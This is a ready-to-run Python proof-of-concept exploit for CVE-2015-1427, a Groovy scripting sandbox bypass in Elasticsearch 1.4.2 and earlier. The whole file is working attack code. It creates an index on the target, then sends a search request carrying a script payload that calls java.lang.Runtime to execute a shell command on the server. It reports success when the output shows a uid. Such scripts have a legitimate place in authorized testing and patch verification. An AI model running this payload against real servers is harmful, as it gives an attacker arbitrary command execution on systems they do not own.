#!/usr/bin/env python3
"""
Elasticsearch Groovy RCE (CVE-2015-1427) PoC
Sandbox bypass in dynamic scripting for Elasticsearch <= 1.4.2
"""
import sys
import urllib.request
import json

def exploit(target_url: str):
    print(f"[*] Target: {target_url}")
    print(f"[*] CVE-2015-1427 - Elasticsearch Groovy RCE")
    print()

    print("[*] Step 1: Creating test index...")
    try:
        data = json.dumps({"name": "test"}).encode()
        req = urllib.request.Request(
            f"{target_url}/test_index/test_type/1",
            data=data, method='POST'
        )
        req.add_header('Content-Type', 'application/json')
        urllib.request.urlopen(req, timeout=10)
        print("[+] Test index created")
    except Exception as e:
        print(f"[!] Index creation: {e} (may already exist)")

    print("[*] Step 2: Sending Groovy RCE payload...")
    payload = {
        "size": 1,
        "script_fields": {
            "rce": {
                "script": 'java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec("id").text'
            }
        }
    }

    try:
        data = json.dumps(payload).encode()
        req = urllib.request.Request(
            f"{target_url}/_search?pretty",
            data=data, method='POST'
        )
        req.add_header('Content-Type', 'application/json')
        resp = urllib.request.urlopen(req, timeout=10)
        body = resp.read().decode('utf-8', errors='replace')

        print(f"[+] Response:")
        print(body[:2000])

        if 'uid=' in body:
            print()
            print("[+] SUCCESS: Remote code execution confirmed!")
        else:
            print()
            print("[!] Payload sent but no clear RCE in response")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == '__main__':
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:9041"
    exploit(url)
